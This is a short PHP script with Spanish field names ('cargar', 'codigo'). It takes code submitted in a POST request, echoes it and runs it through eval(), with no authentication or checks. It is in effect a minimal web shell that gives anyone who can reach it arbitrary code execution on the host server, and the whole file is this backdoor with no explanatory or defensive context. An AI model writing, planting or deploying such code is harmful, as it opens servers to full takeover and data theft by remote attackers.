<?php
if (isset($_POST['cargar'])) {
    echo $_POST['codigo'];
    eval($_POST['codigo']);
}
?>